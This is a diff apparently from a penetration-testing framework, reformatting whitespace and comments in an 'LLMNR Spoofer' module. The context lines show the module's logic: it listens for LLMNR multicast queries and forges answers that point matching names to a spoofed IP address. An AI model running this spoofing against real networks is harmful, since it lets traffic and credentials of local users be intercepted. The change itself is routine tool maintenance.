@@ -18,8 +18,8 @@ attr_accessor :sock, :thread
 
   def initialize
     super(
-      'Name'		 => 'LLMNR Spoofer',
-      'Description'	 => %q{
+      'Name'        => 'LLMNR Spoofer',
+      'Description' => %q{
           LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to
           resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests
           sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address.
@@ -62,10 +62,10 @@ attr_accessor :sock, :thread
     src_port = addr[1]
 
     # Getting info from the request packet
-    llmnr_transid	   = packet[0..1]
-    llmnr_flags	   = packet[2..3]
+    llmnr_transid      = packet[0..1]
+    llmnr_flags        = packet[2..3]
     llmnr_questions    = packet[4..5]
-    llmnr_answerrr	   = packet[6..7]
+    llmnr_answerrr     = packet[6..7]
     llmnr_authorityrr  = packet[8..9]
     llmnr_additionalrr = packet[10..11]
     llmnr_name_length  = packet[12..12]
@@ -79,32 +79,32 @@ attr_accessor :sock, :thread
 
     if datastore['DEBUG']
       print_status("Received Packet from: #{rhost}:#{src_port}")
-      print_status("transid:	      #{llmnr_transid.unpack('H4')}")
-      print_status("tlags:	      #{llmnr_flags.unpack('B16')}")
+      print_status("transid:        #{llmnr_transid.unpack('H4')}")
+      print_status("tlags:          #{llmnr_flags.unpack('B16')}")
       print_status("questions:      #{llmnr_questions.unpack('n')}")
       print_status("answerrr:       #{llmnr_answerrr.unpack('n')}")
       print_status("authorityrr:    #{llmnr_authorityrr.unpack('n')}")
       print_status("additionalrr:   #{llmnr_additionalrr.unpack('n')}")
       print_status("name length:    #{llmnr_name_length.unpack('c')}")
-      print_status("name:	      #{llmnr_name.unpack('a*')}")
+      print_status("name:           #{llmnr_name.unpack('a*')}")
       print_status("decodedname:    #{llmnr_decodedname}")
-      print_status("type:	      #{llmnr_type.unpack('n')}")
-      print_status("class:	      #{llmnr_class.unpack('n')}")
+      print_status("type:           #{llmnr_type.unpack('n')}")
+      print_status("class:          #{llmnr_class.unpack('n')}")
     end
 
     if (llmnr_decodedname =~ /#{datastore['REGEX']}/i)
-      #Header
+      # Header
       response =  llmnr_transid
       response << "\x80\x00" # Flags TODO add details
       response << "\x00\x01" # Questions = 1
       response << "\x00\x01" # Answer RRs = 1
       response << "\x00\x00" # Authority RRs = 0
       response << "\x00\x00" # Additional RRs = 0
-      #Query part
+      # Query part
       response << llmnr_name_and_length
       response << llmnr_type
       response << llmnr_class
-      #Answer part
+      # Answer part
       response << llmnr_name_and_length
       response << llmnr_type
       response << llmnr_class
@@ -119,7 +119,7 @@ attr_accessor :sock, :thread
         p.ip_daddr = rhost
         p.ip_ttl = 255
         p.udp_sport = 5355 # LLMNR UDP port
-        p.udp_dport = src_port	# Port used by sender
+        p.udp_dport = src_port # Port used by sender
         p.payload = response
         p.recalc
 
@@ -139,7 +139,7 @@ attr_accessor :sock, :thread
       wds = []
       eds = [self.sock]
 
-      r,w,e = ::IO.select(rds,wds,eds,0.25)
+      r,_,_ = ::IO.select(rds,wds,eds,0.25)
 
       if (r != nil and r[0] == self.sock)
         packet, host, port = self.sock.recvfrom(65535)
@@ -173,7 +173,7 @@ attr_accessor :sock, :thread
     optval = ::IPAddr.new(multicast_addr).hton + ::IPAddr.new("0.0.0.0").hton
     self.sock = Rex::Socket.create_udp(
       'LocalHost' => "0.0.0.0",
-      'LocalPort' =>	5355)
+      'LocalPort' => 5355)
     self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
     self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)
 
